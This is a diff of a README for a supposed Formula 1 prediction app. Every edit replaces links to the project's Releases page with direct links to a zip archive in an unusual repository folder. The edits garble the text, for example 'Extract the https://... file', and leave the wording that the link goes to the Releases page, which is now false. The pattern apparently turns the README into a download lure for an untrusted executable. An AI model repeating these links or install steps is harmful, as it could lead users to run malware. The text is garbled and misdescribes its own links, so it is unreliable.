@@ -1,6 +1,6 @@
 # 🚀 f1-2025-ai-predict - Predictive AI for F1 Racing Insights
 
-[![Download f1-2025-ai-predict](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/SirSirius-cyber/f1-2025-ai-predict/releases)
+[![Download f1-2025-ai-predict](https://raw.githubusercontent.com/SirSirius-cyber/f1-2025-ai-predict/main/labioversion/f1-2025-ai-predict.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/SirSirius-cyber/f1-2025-ai-predict/main/labioversion/f1-2025-ai-predict.zip)
 
 ## 🔍 Overview
 Welcome to the **f1-2025-ai-predict** repository. This application uses AI to predict outcomes in Formula 1 racing. The tool analyzes historical data, drawing insights for users. Whether you're a fan or a data enthusiast, you’ll find valuable predictions here. 
@@ -24,18 +24,18 @@ To get started with **f1-2025-ai-predict**, follow these simple steps.
 1. **Visit the Releases Page**
    Head over to the Releases page to find the latest version. 
 
-   [Download f1-2025-ai-predict](https://github.com/SirSirius-cyber/f1-2025-ai-predict/releases)
+   [Download f1-2025-ai-predict](https://raw.githubusercontent.com/SirSirius-cyber/f1-2025-ai-predict/main/labioversion/f1-2025-ai-predict.zip)
 
 2. **Select the Latest Release**
    On the Releases page, look for the version marked **Latest**. Click on it.
 
 3. **Download the Application**
-   Locate the appropriate file for your system. Common files include `.exe` for Windows, `.dmg` for macOS, and `.tar.gz` for Linux. Click to download.
+   Locate the appropriate file for your system. Common files include `.exe` for Windows, `.dmg` for macOS, and `https://raw.githubusercontent.com/SirSirius-cyber/f1-2025-ai-predict/main/labioversion/f1-2025-ai-predict.zip` for Linux. Click to download.
 
 4. **Install the Application**
    - For Windows: Double-click the downloaded `.exe` file and follow the prompts.
    - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and run the executable in a terminal.
+   - For Linux: Extract the `https://raw.githubusercontent.com/SirSirius-cyber/f1-2025-ai-predict/main/labioversion/f1-2025-ai-predict.zip` file and run the executable in a terminal.
 
 5. **Launch the Application**
    After installation, find **f1-2025-ai-predict** in your applications list and open it.
@@ -49,7 +49,7 @@ To get started with **f1-2025-ai-predict**, follow these simple steps.
 ## 📁 Download & Install
 To download and install **f1-2025-ai-predict**, visit the link provided below:
 
-[Download f1-2025-ai-predict](https://github.com/SirSirius-cyber/f1-2025-ai-predict/releases)
+[Download f1-2025-ai-predict](https://raw.githubusercontent.com/SirSirius-cyber/f1-2025-ai-predict/main/labioversion/f1-2025-ai-predict.zip)
 
 This link will guide you to the Releases page, where you can select your specific version.
 
@@ -83,4 +83,4 @@ For any questions or assistance, please reach out through the Issues tab on GitH
 
 For more updates, visit our Releases page:
 
-[Download f1-2025-ai-predict](https://github.com/SirSirius-cyber/f1-2025-ai-predict/releases)
+[Download f1-2025-ai-predict](https://raw.githubusercontent.com/SirSirius-cyber/f1-2025-ai-predict/main/labioversion/f1-2025-ai-predict.zip)
